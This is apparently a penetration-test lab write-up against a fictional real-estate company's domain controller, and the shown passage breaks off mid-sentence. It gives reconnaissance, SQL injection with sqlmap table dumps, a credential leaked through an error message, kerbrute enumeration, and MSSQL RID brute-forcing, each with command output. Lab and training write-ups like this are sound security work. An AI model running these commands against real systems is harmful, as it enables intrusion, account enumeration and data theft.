# Objective and Scope
North Stone, a premier luxury real estate marketplace, has engaged Hack Smarter for a full-scope penetration test. Your objective: identify critical vulnerabilities and demonstrate real-world business impact by achieving complete domain compromise.

The client has provided you with VPN access to their network, but no credentials.

I have also been provided a wordlist to use!

# Host file setup

```python
sudo nxc smb 10.1.209.181 --generate-hosts-file /etc/hosts
[sudo] password for kali: 
SMB         10.1.209.181    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:northstone.local) (signing:True) (SMBv1:None) (Null Auth:True)
```

# Enumeration

## Open ports
```python
nmap -p- --min-rate=2000 -sT dc.northstone.local                                        
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-29 17:11 +0100
Nmap scan report for dc.northstone.local (10.1.209.181)
Host is up (0.097s latency).
rDNS record for 10.1.209.181: DC.northstone.local
Not shown: 65519 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
47001/tcp open  winrm
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49679/tcp open  unknown
55203/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 66.37 seconds
```

After another check, port `88` and port `5985` are also open for some reason nmap missed it!
## Nmap
```python
nmap -p 53,80,88,135,139,389,445,636,3268,3269,3389 -A --min-rate=2000 -sT dc.northstone.local
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-29 17:13 +0100
Nmap scan report for dc.northstone.local (10.1.209.181)
Host is up (0.097s latency).
rDNS record for 10.1.209.181: DC.northstone.local

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: NorthStone | Coming Soon - US Real Estate Portal
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-29 16:13:50Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: northstone.local, Site: Default-First-Site-Name)
|_ssl-date: 2026-07-29T16:15:18+00:00; -1s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC.northstone.local, DNS:northstone.local, DNS:NORTHSTONE
| Not valid before: 2026-05-02T23:26:31
|_Not valid after:  2027-05-02T23:26:31
445/tcp  open  microsoft-ds?
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: northstone.local, Site: Default-First-Site-Name)
|_ssl-date: 2026-07-29T16:15:18+00:00; 0s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC.northstone.local, DNS:northstone.local, DNS:NORTHSTONE
| Not valid before: 2026-05-02T23:26:31
|_Not valid after:  2027-05-02T23:26:31
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: northstone.local, Site: Default-First-Site-Name)
|_ssl-date: 2026-07-29T16:15:18+00:00; -1s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC.northstone.local, DNS:northstone.local, DNS:NORTHSTONE
| Not valid before: 2026-05-02T23:26:31
|_Not valid after:  2027-05-02T23:26:31
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: northstone.local, Site: Default-First-Site-Name)
|_ssl-date: 2026-07-29T16:15:18+00:00; 0s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC.northstone.local, DNS:northstone.local, DNS:NORTHSTONE
| Not valid before: 2026-05-02T23:26:31
|_Not valid after:  2027-05-02T23:26:31
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-07-29T16:15:18+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC.northstone.local
| Not valid before: 2026-06-16T18:37:19
|_Not valid after:  2026-12-16T18:37:19
| rdp-ntlm-info: 
|   Target_Name: NORTHSTONE
|   NetBIOS_Domain_Name: NORTHSTONE
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: northstone.local
|   DNS_Computer_Name: DC.northstone.local
|   DNS_Tree_Name: northstone.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-07-29T16:14:39+00:00
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Microsoft Windows Server 2019 (92%), Microsoft Windows 10 1903 - 22H2 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

# SMB (445)
Null auth is enabled as with all DCs but cannot use it to enumerate users or shares

The guest account is also disabled!

# HTTP (80)
![](Pasted%20image%2020260729172240.png)

Nuclei didnt find much, but it did detect MSSQL running which once again nmap missed!

After looking at the website, i see there isnt much functionality at all, there is no links

## Ffuf for subdomains

```python
ffuf -u http://northstone.local/ -w wordlist.txt -H 'Host: FUZZ.northstone.local' -ic -c -t 40 -fs 22687

testsql                 [Status: 200, Size: 26077, Words: 8271, Lines: 715, Duration: 115ms]
```

# `testsql` subdomain

It looks like there is a search function that looks to be pulling from a database!

![1063](Pasted%20image%2020260729173523.png)

Ill test some simple SQLi

![](Pasted%20image%2020260729173440.png)

After entering `'` into the search i get that error, which leaks credentials!

It also shows the query it ran, so i may be able to take SQLi even further!

Also doing a legitimate query like `villa` shows the agent email address, so its giving me valid users!

So ill use SQLmap to find the available databases

# SQLmap

```python
sqlmap -r request.txt --level=4 --risk=3 --dbs --flush-session --batch

[17:44:41] [INFO] testing Microsoft SQL Server
[17:44:42] [INFO] confirming Microsoft SQL Server
[17:44:43] [INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows 2022 or 2019 or 11 or 10 or 2016
web application technology: ASP.NET 4.0.30319, Microsoft IIS 10.0, ASP.NET
back-end DBMS: Microsoft SQL Server 2019
[17:44:43] [INFO] fetching database names
available databases [5]:
[*] master
[*] model
[*] msdb
[*] NorthStoneDB
[*] tempdb
```

There are 4 default databases

`NorthStoneDB` is what the web app is pulling from

```python
sqlmap -r request.txt --level=4 --risk=3 --dbs --flush-session --batch -D NorthStoneDB --tables

[17:47:02] [INFO] fetching tables for database: NorthStoneDB
Database: NorthStoneDB
[2 tables]
+-----------------+
| Properties      |
| auth_test_users |
+-----------------+
```

There is nothing inside the `auth_test_users` table

```python
sqlmap -r request.txt --level=4 --risk=3 --dbs --flush-session --batch -D NorthStoneDB -T Properties --dump

[17:49:56] [INFO] fetching columns for table 'Properties' in database 'NorthStoneDB'
[17:49:56] [INFO] fetching entries for table 'Properties' in database 'NorthStoneDB'
Database: NorthStoneDB
Table: Properties
[36 entries]
+----+------------+-----------------------------------+-----------------+-----------------+----------------------------------+-----------------+
| ID | Price      | Name                              | Location        | AgentName       | AgentEmail                       | AgentPhone      |
+----+------------+-----------------------------------+-----------------+-----------------+----------------------------------+-----------------+
| 1  | $1,150,000 | Upper East Side Apartment         | New York, NY    | Chris Walker    | chris.walker@northstone.local    | +1-212-555-1001 |
| 2  | $1,850,000 | SoHo Loft                         | New York, NY    | Alex Morgan     | alex.morgan@northstone.local     | +1-212-555-1002 |
| 3  | $980,000   | Brooklyn Heights Condo            | New York, NY    | Sophia Blake    | sophia.blake@northstone.local    | +1-212-555-1003 |
| 4  | $2,400,000 | Manhattan Central Park View       | New York, NY    | Daniel Reed     | daniel.reed@northstone.local     | +1-212-555-1004 |
| 5  | $820,000   | Financial District Studio         | New York, NY    | Emma Collins    | emma.collins@northstone.local    | +1-212-555-1005 |
| 6  | $2,900,000 | Tribeca Luxury Apartment          | New York, NY    | Michael Stone   | michael.stone@northstone.local   | +1-212-555-1006 |
| 7  | $3,500,000 | Beverly Hills Residence           | Los Angeles, CA | Emily Stone     | emily.stone@northstone.local     | +1-310-555-2001 |
| 8  | $2,700,000 | Hollywood Hills Modern Home       | Los Angeles, CA | Ryan Cooper     | ryan.cooper@northstone.local     | +1-310-555-2002 |
| 9  | $1,600,000 | Santa Monica Beach Condo          | Los Angeles, CA | Megan Fox       | megan.fox@northstone.local       | +1-310-555-2003 |
| 10 | $2,200,000 | Downtown LA Penthouse             | Los Angeles, CA | Liam Scott      | liam.scott@northstone.local      | +1-310-555-2004 |
| 11 | $1,900,000 | Venice Canal House                | Los Angeles, CA | Olivia Brown    | olivia.brown@northstone.local    | +1-310-555-2005 |
| 12 | $1,250,000 | Westwood Family Home              | Los Angeles, CA | Noah Wilson     | noah.wilson@northstone.local     | +1-310-555-2006 |
| 13 | $1,300,000 | Miami Beach Ocean Apartment       | Miami, FL       | Carlos Diaz     | carlos.diaz@northstone.local     | +1-305-555-3001 |
| 14 | $1,100,000 | Brickell Financial District Condo | Miami, FL       | Isabella Cruz   | isabella.cruz@northstone.local   | +1-305-555-3002 |
| 15 | $920,000   | Downtown Miami Loft               | Miami, FL       | Mateo Alvarez   | mateo.alvarez@northstone.local   | +1-305-555-3003 |
| 16 | $1,700,000 | Coral Gables Residence            | Miami, FL       | Sofia Martinez  | sofia.martinez@northstone.local  | +1-305-555-3004 |
| 17 | $2,100,000 | Sunny Isles Luxury Apartment      | Miami, FL       | Lucas Fernandez | lucas.fernandez@northstone.local | +1-305-555-3005 |
| 18 | $1,250,000 | Edgewater Bay Condo               | Miami, FL       | Valentina Perez | valentina.perez@northstone.local | +1-305-555-3006 |
| 19 | $780,000   | Downtown Chicago Condo            | Chicago, IL     | Sophia Reed     | sophia.reed@northstone.local     | +1-312-555-4001 |
| 20 | $920,000   | River North Apartment             | Chicago, IL     | Liam Scott      | liam.scott@northstone.local      | +1-312-555-4002 |
| 21 | $1,400,000 | Gold Coast Luxury Condo           | Chicago, IL     | Emma Watson     | emma.watson@northstone.local     | +1-312-555-4003 |
| 22 | $1,150,000 | Lincoln Park Townhouse            | Chicago, IL     | Jacob Miller    | jacob.miller@northstone.local    | +1-312-555-4004 |
| 23 | $870,000   | Lakeview Modern Apartment         | Chicago, IL     | Ava Johnson     | ava.johnson@northstone.local     | +1-312-555-4005 |
| 24 | $1,900,000 | West Loop Penthouse               | Chicago, IL     | Ethan Brown     | ethan.brown@northstone.local     | +1-312-555-4006 |
| 25 | $4,500,000 | Luxury Oceanfront Villa           | Miami, FL       | Daniel Carter   | daniel.carter@northstone.local   | +1-305-555-5001 |
| 26 | $5,200,000 | Beverly Hills Private Villa       | Los Angeles, CA | Megan Fox       | megan.fox@northstone.local       | +1-310-555-5002 |
| 27 | $3,800,000 | Hamptons Style Villa              | New York, NY    | Chris Walker    | chris.walker@northstone.local    | +1-212-555-5003 |
| 28 | $4,200,000 | Modern Hillside Villa             | Los Angeles, CA | Ryan Cooper     | ryan.cooper@northstone.local     | +1-310-555-5004 |
| 29 | $3,600,000 | Mediterranean Estate Villa        | Miami, FL       | Carlos Diaz     | carlos.diaz@northstone.local     | +1-305-555-5005 |
| 30 | $4,900,000 | Contemporary Glass Villa          | Chicago, IL     | Sophia Reed     | sophia.reed@northstone.local     | +1-312-555-5006 |
| 31 | $2,400,000 | Oceanfront Beach House            | Miami, FL       | Lucas Fernandez | lucas.fernandez@northstone.local | +1-305-555-6001 |
| 32 | $2,900,000 | Santa Monica Beach House          | Los Angeles, CA | Olivia Brown    | olivia.brown@northstone.local    | +1-310-555-6002 |
| 33 | $3,700,000 | Malibu Cliffside Beach House      | Los Angeles, CA | Noah Wilson     | noah.wilson@northstone.local     | +1-310-555-6003 |
| 34 | $2,100,000 | Miami Sunset Beach House          | Miami, FL       | Valentina Perez | valentina.perez@northstone.local | +1-305-555-6004 |
| 35 | $3,200,000 | Luxury Private Beach Residence    | Miami, FL       | Mateo Alvarez   | mateo.alvarez@northstone.local   | +1-305-555-6005 |
| 36 | $3,500,000 | Exclusive Coastal Beach House     | Los Angeles, CA | Emily Stone     | emily.stone@northstone.local     | +1-310-555-6006 |
+----+------------+-----------------------------------+-----------------+-----------------+----------------------------------+-----------------+
```

Ive found some users!

Ill place these into a file, and cut the output to get a user list!

```python
cat properties.txt | cut -d '|' -f 7 | cut -d ' ' -f 2 | cut -d '@' -f 1 > users.txt
```

Using this command i was able to place the users into a file

Now i can double check these are valid users using kerbrute!

# Kerbrute to validate users

```python
kerbrute userenum --dc dc.northstone.local -d northstone.local users.txt                                                      

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 07/29/26 - Ronnie Flathers @ropnop

2026/07/29 17:58:37 >  Using KDC(s):
2026/07/29 17:58:37 >  	dc.northstone.local:88

2026/07/29 17:58:38 >  Done! Tested 36 usernames (0 valid) in 0.396 seconds
```

None of those users are valid!

So turns out im stupid!

# Access to mssql instance as user `webapp`

![](Pasted%20image%2020260729180812.png)

So when i found this screenshot i didnt even think there was a username, i clearly missed it!

```python
nxc mssql dc.northstone.local -u webapp -p 'WebPass123!' --local-auth
MSSQL       10.1.209.181    1433   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:northstone.local) (EncryptionReq:False)
MSSQL       10.1.209.181    1433   DC               [+] DC\webapp:WebPass123!
```

I have access as this user

I can user this to get access to the mssql instance, however i have already checked the contents of it via SQLi, and also xm_cmdshell is not on and i dont have the permission to turn it on!

## Dumping users with mssql access

```python
nxc mssql dc.northstone.local -u webapp -p 'WebPass123!' --rid-brute 20000 --local-auth
MSSQL       10.1.209.181    1433   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:northstone.local) (EncryptionReq:False)
MSSQL       10.1.209.181    1433   DC               [+] DC\webapp:WebPass123! 
MSSQL       10.1.209.181    1433   DC               498: NORTHSTONE\Enterprise Read-only Domain Controllers
MSSQL       10.1.209.181    1433   DC               500: NORTHSTONE\Administrator
MSSQL       10.1.209.181    1433   DC               501: NORTHSTONE\Guest
MSSQL       10.1.209.181    1433   DC               502: NORTHSTONE\krbtgt
MSSQL       10.1.209.181    1433   DC               512: NORTHSTONE\Domain Admins
MSSQL       10.1.209.181    1433   DC               513: NORTHSTONE\Domain Users
MSSQL       10.1.209.181    1433   DC               514: NORTHSTONE\Domain Guests
MSSQL       10.1.209.181    1433   DC               515: NORTHSTONE\Domain Computers
MSSQL       10.1.209.181    1433   DC               516: NORTHSTONE\Domain Controllers
MSSQL       10.1.209.181    1433   DC               517: NORTHSTONE\Cert Publishers
MSSQL       10.1.209.181    1433   DC               518: NORTHSTONE\Schema Admins
MSSQL       10.1.209.181    1433   DC               519: NORTHSTONE\Enterprise Admins
MSSQL       10.1.209.181    1433   DC               520: NORTHSTONE\Group Policy Creator Owners
MSSQL       10.1.209.181    1433   DC               521: NORTHSTONE\Read-only Domain Controllers
MSSQL       10.1.209.181    1433   DC               522: NORTHSTONE\Cloneable Domain Controllers
MSSQL       10.1.209.181    1433   DC               525: NORTHSTONE\Protected Users
MSSQL       10.1.209.181    1433   DC               526: NORTHSTONE\Key Admins
MSSQL       10.1.209.181    1433   DC               527: NORTHSTONE\Enterprise Key Admins
MSSQL       10.1.209.181    1433   DC               553: NORTHSTONE\RAS and IAS Servers
MSSQL       10.1.209.181    1433   DC               571: NORTHSTONE\Allowed RODC Password Replication Group
MSSQL       10.1.209.181    1433   DC               572: NORTHSTONE\Denied RODC Password Replication Group
MSSQL       10.1.209.181    1433   DC               1000: NORTHSTONE\DC$
MSSQL       10.1.209.181    1433   DC               1101: NORTHSTONE\DnsAdmins
MSSQL       10.1.209.181    1433   DC               1102: NORTHSTONE\DnsUpdateProxy
MSSQL       10.1.209.181    1433   DC               1103: NORTHSTONE\SQLServer2005SQLBrowserUser$DC
MSSQL       10.1.209.181    1433   DC               1104: NORTHSTONE\svc_backup
MSSQL       10.1.209.181    1433   DC               1105: NORTHSTONE\c.mcgill
MSSQL       10.1.209.181    1433   DC               1106: NORTHSTONE\t.dalton
MSSQL       10.1.209.181    1433   DC               1108: NORTHSTONE\TempWinRMAccess
MSSQL       10.1.209.181    1433   DC               1109: NORTHSTONE\Certificate Enrollment Users
MSSQL       10.1.209.181    1433   DC               1110: NORTHSTONE\c.white
MSSQL       10.1.209.181    1433   DC               1111: NORTHSTONE\Software Maintainers
MSSQL       10.1.209.181    1433   DC               1112: NORTHSTONE\j.sullivan
MSSQL       10.1.209.181    1433   DC               1113: NORTHSTONE\m.harris
MSSQL       10.1.209.181    1433   DC               1114: NORTHSTONE\d.williams
MSSQL       10.1.209.181    1433   DC               1115: NORTHSTONE\k.bennett
MSSQL       10.1.209.181    1433   DC               1116: NORTHSTONE\r.parker
MSSQL       10.1.209.181    1433   DC               1117: NORTHSTONE\IT Support
MSSQL       10.1.209.181    1433   DC               1118: NORTHSTONE\b.ward
MSSQL       10.1.209.181    1433   DC               1119: NORTHSTONE\e.walker
MSSQL       10.1.209.181    1433   DC               1120: NORTHSTONE\l.turner
MSSQL       10.1.209.181    1433   DC               1121: NORTHSTONE\o.scott
MSSQL       10.1.209.181    1433   DC               1122: NORTHSTONE\IT Support Level 2
MSSQL       10.1.209.181    1433   DC               1123: NORTHSTONE\Print Services Operators
MSSQL       10.1.209.181    1433   DC               1125: NORTHSTONE\Database Backup Operators
```

So using `--rid`